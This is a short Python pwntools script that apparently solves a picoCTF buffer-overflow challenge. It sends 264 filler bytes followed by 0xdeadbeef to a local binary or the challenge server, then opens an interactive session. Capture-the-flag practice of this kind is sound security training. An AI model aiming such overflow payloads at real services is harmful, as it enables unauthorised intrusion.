#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("mars.picoctf.net", 31890)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    payload = flat(b'A'*264, 0xdeadbeef)
    io.sendlineafter(b'?', payload)

    io.interactive()

if __name__ == "__main__":
    main()
